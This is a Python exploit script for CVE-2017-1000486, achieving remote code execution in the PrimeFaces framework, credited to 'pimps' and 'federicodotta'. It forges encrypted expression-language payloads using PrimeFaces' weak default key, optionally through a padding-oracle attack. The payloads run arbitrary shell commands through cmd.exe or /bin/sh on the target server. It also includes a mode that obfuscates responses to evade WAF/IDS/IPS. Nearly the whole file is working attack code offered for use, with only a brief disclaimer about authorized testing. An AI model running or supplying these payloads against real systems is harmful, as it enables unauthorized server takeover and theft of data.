from paddingoracle import BadPaddingException, PaddingOracle
import requests
from Crypto.Hash import MD5
from Crypto.Cipher import DES
import base64
import socket
import time
import logging
import argparse

"""
CVE-2017-1000486 exploit coded by pimps, with additional payloads and checks by federicodotta

This exploit allows to detect and exploit CVE-2017-1000486 issue on PrimeFaces, with various application servers, 
to achieve remote command executions.

Repository of this modified version: https://github.com/federicodotta/Exploit
Repository of the original version: https://github.com/pimps/CVE-2017-1000486

DICLAIMER
This software has been created purely for the authorized penetration testing and red teaming activies, 
and is not intended to be used to attack systems except where explicitly authorized. Project maintainers 
are not responsible or liable for misuse of the software. Use responsibly.
"""

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        requests.packages.urllib3.disable_warnings()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        payload = base64.b64encode(data)

        while 1:
            try:
                post_params = {'pfdrt':'sc', 'ln':'primefaces', 'pfdrid': payload}
                response = self.session.post(self.target, data=post_params, stream=False, timeout=5, verify=False, proxies=self.proxies, headers=self.headers)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...', self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)

        # An HTTP 500 error was returned, likely due to incorrect padding
        if response.status_code == 500:
            logging.exception('No padding exception raised on %r', payload)
            return

        raise BadPaddingException

def pretty_print_POST(req):

    return '{}\n{}\n\n{}'.format(
        req.method + ' ' + req.url,
        '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    )

def pretty_print_response(res):

    return '{}\n{}\n\n{}'.format(
        res.status_code,
        '\n'.join('{}: {}'.format(k, v) for k, v in res.headers.items()),
        repr(res.text),
    )  


def get_args():
    parser = argparse.ArgumentParser( prog="primefaces.py",
                      formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                      epilog= '''
                       This script exploits an expression language remote code execution flaw in the Primefaces JSF framework.
                       Primefaces versions prior to 5.2.21, 5.3.8 or 6.0 are vulnerable to a padding oracle attack, 
                       due to the use of weak crypto and default encryption password and salt.
                      ''')

    parser.add_argument("target", help="Target Host")
    parser.add_argument("-pw", "--password", default="primefaces", help="Primefaces Password (Default = primefaces")
    parser.add_argument("-pt", "--path", default="/javax.faces.resource/dynamiccontent.properties.xhtml", help="Path to dynamiccontent.properties (Default = /javax.faces.resource/dynamiccontent.properties.xhtml)")
    parser.add_argument("-c", "--cmd", default="whoami", help="Command to execute. (Default = whoami)")
    parser.add_argument("-px", "--proxy", default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (Default = None)")
    parser.add_argument("-o", "--oracle", default="0", help="Exploit the target with Padding Oracle. Use 1 to activate. (Default = 0) (SLOW)")
    parser.add_argument("-w", "--websphere", default="0", help="Exploit the target on a IBM WebSphere target. Use 1 to activate. (Default = 0)")
    parser.add_argument("-ob", "--obfuscate", default="0", help="Enable obfuscation on responses (requests are encrypted), usefull to bypass WAF/IDS/IPS. Not supported in WebSphere mode (only for target JDK >= 7). Use 1 to activate. (Default = 0)")
    parser.add_argument("-pl", "--payload", default="", help="EL Encrypted payload. That function is meant to be used with the Padding Oracle generated payload. (Default = None) ")
    parser.add_argument("-ln", "--length", default="50", help="Chars of the output of the command to read. Only in WebSphere mode. Be carefull, big number causes huge requests.")
    parser.add_argument("-O", "--output", default="", help="Output to folder (ending with / or \\)")
    parser.add_argument("-ck", "--check", default="0", help="Check if target is vulnerable (two different payloads). Use 1  or 2 to activate. (Default = 0)")
    args = parser.parse_args()
    return args


"""Mimic Java's PBEWithMD5AndDES algorithm used by Primefaces"""
def encrypt(data, password):
    # Padding clear-text using PKCS5 algo
    padding = 8 - len(data) % 8
    data += chr(padding) * padding
    # IV and "iterations count" extracted from primefaces sourcecode
    iterations = 19
    iv = b'\xa9\x9b\xc8\x32\x56\x34\xe3\x03'
    hasher = MD5.new()
    hasher.update(password)
    hasher.update(iv)
    result = hasher.digest()

    for i in range(1, iterations):
        hasher = MD5.new()
        hasher.update(result)
        result = hasher.digest()

    cipher = DES.new(result[:8], DES.MODE_CBC, result[8:16])
    encrypted = cipher.encrypt(data)
    print ("[*] Generated Encrypted Payload: " + str(base64.b64encode(encrypted)))
    return str(base64.b64encode(encrypted))

def first_check(target, path, password, proxy):
    requests.packages.urllib3.disable_warnings()
    proxies = {
        'http': proxy, 
        'https': proxy
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Accept': '*/*'
    }
    payloadEL =  '${facesContext.getExternalContext().getSession(true).setAttribute("writer_output_stream",facesContext.getExternalContext().getResponseOutputStream())}'
    payloadEL += '${facesContext.getExternalContext().getSession(true).getAttribute("writer_output_stream").write("VULNERABLE PRIMEFACES VER    ".getBytes(),0,25)}'
    payloadEL += '${facesContext.getExternalContext().getSession(true).getAttribute("writer_output_stream").flush()}'
    payloadEL += '${facesContext.getExternalContext().getSession(true).getAttribute("writer_output_stream").close()}'  
    
    payload = encrypt(payloadEL, password)

    post_params = {'pfdrt':'sc', 'ln':'primefaces', 'pfdrid': payload}
    print ("[*] Attempting to execute Check 1")

    post_request = requests.Request('POST',target+path, data=post_params, headers=headers)
    post_request_preapred = post_request.prepare()      
    sess = requests.Session()
    r = sess.send(post_request_preapred, proxies=proxies,verify=False)

    if "VULNERABLE PRIMEFACES" in r.text:
        print("[+] VULNERABLE!!!!")
        print(r.text)
    else:
        print("[-] POTENTIALLY NOT VULNERABLE")
        print("Reponse headers: ")
        print(r.headers)
        print("Reponse body: ")
        print(r.text)

def second_check(target, path, password, proxy):
    requests.packages.urllib3.disable_warnings()
    proxies = {
        'http': proxy, 
        'https': proxy
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Accept': '*/*'
    }
    payloadEL =  '${facesContext.getExternalContext().setResponseHeader("primesecretchk","123456")}'
    
    payload = encrypt(payloadEL, password)

    post_params = {'pfdrt':'sc', 'ln':'primefaces', 'pfdrid': payload}
    print ("[*] Attempting to execute Check 2")

    post_request = requests.Request('POST',target+path, data=post_params, headers=headers)
    post_request_preapred = post_request.prepare()      
    sess = requests.Session()
    r = sess.send(post_request_preapred, proxies=proxies,verify=False)

    if "primesecretchk" in r.headers.keys():
        print("[+] VULNERABLE!!!!")
        print(r.headers['primesecretchk'])
    else:
        print("[-] POTENTIALLY NOT VULNERABLE")
        print("Reponse headers: ")
        print(r.headers)
        print("Reponse body: ")
        print(r.text)

def exploit(target, path, cmd, password, proxy, websphere, obfuscate, command_output_length, output_folder, payload=""):
    requests.packages.urllib3.disable_warnings()
    proxies = {
        'http': proxy, 
        'https': proxy
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Accept': '*/*'
    }

    if payload == "":

      if websphere == "0":

        payloadEL =  '${session.setAttribute("scriptfactory","".getClass().forName("javax.script.ScriptEngineManager").newInstance())}'
        payloadEL += '${session.setAttribute("scriptengine",session.getAttribute("scriptfactory").getEngineByName("JavaScript"))}'
        payloadEL += '${session.getAttribute("scriptengine").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}'
        payloadEL += '${session.getAttribute("scriptengine").eval('
        payloadEL += '"var os = java.lang.System.getProperty(\\"os.name\\");'
        payloadEL += 'var proc = null;'
        payloadEL += 'os.toLowerCase().contains(\\"win\\")? '
        payloadEL += 'proc = new java.lang.ProcessBuilder[\\"(java.lang.String[])\\"]([\\"cmd.exe\\",\\"/C\\",\\"".concat(\"XXXXXXXXXX\").concat("\\"]).start()'
        payloadEL += ' : proc = new java.lang.ProcessBuilder[\\"(java.lang.String[])\\"]([\\"/bin/sh\\",\\"-c\\",\\"").concat(\"XXXXXXXXXX\").concat("\\"]).start();'
        payloadEL += 'var is = proc.getInputStream();'
        payloadEL += 'var sc = new java.util.Scanner(is,\\"UTF-8\\"); var out = \\"\\";'
        payloadEL += 'while(sc.hasNext()) {out += sc.nextLine()+String.fromCharCode(10);}'

        if obfuscate == "0":
          payloadEL += 'print(out);"))}'
        else:
          payloadEL += 'var enc = java.util.Base64.getEncoder();'
          payloadEL += 'var outBase = enc.encodeToString(out.getBytes());'
          payloadEL += 'var outReverse = new java.lang.StringBuffer(outBase).reverse().toString();'
          payloadEL += 'print(outReverse);"))}'

        payloadEL += '${facesContext.getExternalContext().getResponse().getWriter().flush()}'
        payloadEL += '${facesContext.getExternalContext().getResponse().getWriter().close()}';

        payload = encrypt(payloadEL.replace('XXXXXXXXXX',cmd), password)

      else:

        payloadEL =  '${facesContext.getExternalContext().getSession(true).setAttribute("writer_output_stream",facesContext.getExternalContext().getResponseOutputStream())}'
        payloadEL += '${facesContext.getExternalContext().getSession(true).setAttribute("processo_runtime",facesContext.getExternalContext().getClass().forName("java.lang.Runtime").getDeclaredMethods()[0].invoke())}'
        payloadEL += '${facesContext.getExternalContext().getSession(true).setAttribute("processo",facesContext.getExternalContext().getSession(true).getAttribute("processo_runtime").exec("XXXXXXXXXX"))}'
        payloadEL += '${facesContext.getExternalContext().getSession(true).setAttribute("processo_input_stream",facesContext.getExternalContext().getSession(true).getAttribute("processo").getInputStream())}'

        for i in range(int(command_output_length)):
            payloadEL += '${facesContext.getExternalContext().getSession(true).getAttribute("writer_output_stream").write(facesContext.getExternalContext().getSession(true).getAttribute("processo_input_stream").read())}'

        payloadEL += '${facesContext.getExternalContext().getSession(true).getAttribute("writer_output_stream").flush()}'
        payloadEL += '${facesContext.getExternalContext().getSession(true).getAttribute("writer_output_stream").close()}'

        payload = encrypt(payloadEL.replace('XXXXXXXXXX',cmd), password)


    post_params = {'pfdrt':'sc', 'ln':'primefaces', 'pfdrid': payload}
    print ("[*] Attempting to execute: %s" % cmd)

    post_request = requests.Request('POST',target+path, data=post_params, headers=headers)
    post_request_preapred = post_request.prepare()      
    sess = requests.Session()
    r = sess.send(post_request_preapred, proxies=proxies,verify=False)

    exploit_result = ""
    if r.text:

      if websphere == "0":

        if obfuscate == "0":
          print ("[+] Exploit Result:\n\n %s" % r.text) 
          exploit_result = r.text

        else:
          # Reverse string and Base64 decode
          decoded_result = base64.b64decode(r.text[::-1])
          print ("[+] Exploit Result:\n\n %s" % decoded_result)
          exploit_result = decoded_result

      else:

        print ("[+] Exploit Result:\n\n %s" % repr(r.text).replace('\\n','\n'))
        exploit_result = repr(r.text).replace('\\n','\n')

    else:
      print ("[-] Response body empty... Target might not be vulnerable or don't use default password... Manually inspect the response and maybe try the padding oracle attack.")

    if output_folder != "":

      current_time = time.time()

      filename_log = "" + str(current_time) + "_log.txt"
      filename_response = "" + str(current_time) + "_response.txt"
      filename_command = "" + str(current_time) + "_command.txt"

      with open(output_folder + filename_log, "a") as log_file, open(output_folder + filename_response, "a") as res_file, open(output_folder + filename_command, "a") as com_file:

        log_file.write("<timestamp>" + str(current_time) + "</timestamp>\n")
        log_file.write("<command>" + cmd + "</command>\n")
        log_file.write("<request>" + base64.b64encode(pretty_print_POST(post_request_preapred)) + "</request>\n")
        log_file.write("<response>" + base64.b64encode(pretty_print_response(r)) + "</response>\n") 

        com_file.write(cmd)

        res_file.write(exploit_result)


def exploit_paddingoracle(target, path, cmd, password, proxy):
    padbuster = PadBuster()
    padbuster.proxies = {
        'http': proxy, 
        'https': proxy
    }
    padbuster.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Accept': '*/*'
    }
    padbuster.target = target+path
    iv = b'\xa9\x9b\xc8\x32\x56\x34\xe3\x03'

    payloadEL =  '${session.setAttribute("scriptfactory","".getClass().forName("javax.script.ScriptEngineManager").newInstance())}'
    payloadEL += '${session.setAttribute("scriptengine",session.getAttribute("scriptfactory").getEngineByName("JavaScript"))}'
    payloadEL += '${session.getAttribute("scriptengine").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}'
    payloadEL += '${session.getAttribute("scriptengine").eval('
    payloadEL += '"var os = java.lang.System.getProperty(\\"os.name\\");'
    payloadEL += 'var proc = null;'
    payloadEL += 'os.toLowerCase().contains(\\"win\\")? '
    payloadEL += 'proc = new java.lang.ProcessBuilder[\\"(java.lang.String[])\\"]([\\"cmd.exe\\",\\"/C\\",\\"".concat(request.getParameter("cmd")).concat("\\"]).start()'
    payloadEL += ' : proc = new java.lang.ProcessBuilder[\\"(java.lang.String[])\\"]([\\"/bin/sh\\",\\"-c\\",\\"").concat(request.getParameter("cmd")).concat("\\"]).start();'
    payloadEL += 'var is = proc.getInputStream();'
    payloadEL += 'var sc = new java.util.Scanner(is,\\"UTF-8\\"); var out = \\"\\";'
    payloadEL += 'while(sc.hasNext()) {out += sc.nextLine()+String.fromCharCode(10);}print(out);"))}'
    payloadEL += '${facesContext.getExternalContext().getResponse().getWriter().flush()}'
    payloadEL += '${facesContext.getExternalContext().getResponse().getWriter().close()}';

    payload = padbuster.encrypt(payloadEL, block_size=8, iv=iv)
    print ("[+] Using the following generated payload:\n\n %s" % base64.b64encode(payload))  
    requests.packages.urllib3.disable_warnings()
    proxies = {'http': proxy, 'https': proxy}
    post_params = {'pfdrt':'sc', 'ln':'primefaces', 'pfdrid': base64.b64encode(payload), 'cmd' : cmd}
    print ("[*] Attempting to execute: %s" % cmd)
    r = requests.post(target+path, data=post_params, verify=False, proxies=proxies, headers=padbuster.headers)
    print(r.headers)
    if r.text:
      print ("[+] Exploit Result:\n\n %s" % r.text)  
    else:
      print ("[-] Response body empty... Target might not be vulnerable... :-(")

def main():
    print ('')
    print ('========================================================================')
    print ('|     CVE-2017-1000486 - Primefaces Remote Code Execution Exploit      |')
    print ('|           by pimps - Edited by federicodotta                         |')
    print ('========================================================================\n')

    args = get_args()
    if (args.oracle.strip() == "0"):
        if(args.check.strip() == "0"):
            if (args.payload.strip() == ""):
                print ("[*] Generating payload using default Password...")  
            else:
                print ("[*] Executing the exploit using a given Payload...")
            exploit(args.target.strip(),args.path.strip(),args.cmd.strip(), args.password.strip(), args.proxy.strip(), args.websphere.strip(),args.obfuscate.strip(),args.length.strip(),args.output.strip(),args.payload.strip())
        elif(args.check.strip() == "1"):
            print("[*] Check if target is vulnerable (first check)")
            first_check(args.target.strip(), args.path.strip(), args.password.strip(), args.proxy.strip())
        elif(args.check.strip() == "2"):
            print("[*] Check if target is vulnerable (second check)")
            second_check(args.target.strip(), args.path.strip(), args.password.strip(), args.proxy.strip())
    else:
        print ("[*] Generating payload with Padding Oracle Attack... (SLOW)")  
        exploit_paddingoracle(args.target.strip(),args.path.strip(),args.cmd.strip(), args.password.strip(), args.proxy.strip())


if __name__ == '__main__':
  main()
